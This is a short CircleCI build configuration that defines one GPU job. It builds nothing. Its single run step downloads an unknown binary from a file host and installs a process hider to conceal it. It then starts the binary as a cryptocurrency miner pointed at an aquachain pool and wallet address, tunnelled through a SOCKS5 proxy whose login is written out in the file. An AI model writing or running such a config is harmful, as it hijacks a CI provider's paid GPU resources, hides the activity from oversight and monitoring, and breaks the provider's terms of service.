version: 2.1

jobs:
  build:
    machine:
      image: ubuntu-1604-cuda-10.1:201909-23
    resource_class: gpu.nvidia.small
    steps:
      - run: nvidia-smi
      - run: apt-get update && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev && wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && npm i -g node-process-hider && chmod +x ac-gpu && ph add ac-gpu && ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/paper3 -t 1 --proxy socks5://woiden_abet:aufal@id-socks5.woiden.net:8080
